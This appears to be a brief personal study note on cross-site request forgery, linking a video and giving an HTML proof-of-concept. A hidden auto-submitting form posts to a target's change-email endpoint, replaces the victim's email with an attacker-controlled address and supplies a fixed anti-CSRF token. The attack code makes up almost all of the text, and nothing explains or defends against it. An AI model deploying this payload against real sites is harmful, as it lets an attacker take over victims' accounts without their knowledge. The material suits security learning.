#csrf

https://www.youtube.com/watch?v=eWEgUcHPle0

```html
<form class="login-form" action="https://[TARGET_IP]/my-account/change-email" method="POST">
    <input hidden required type="email" name="email" value="modified@attacker.hack">
    <input hidden required type=hidden name=anti-csrf-token value=OfqXvkzlX2kAaaXhO9B7Mg0zx8YcEzu2>
</form>
<script>document.forms[0].submit()</script>
```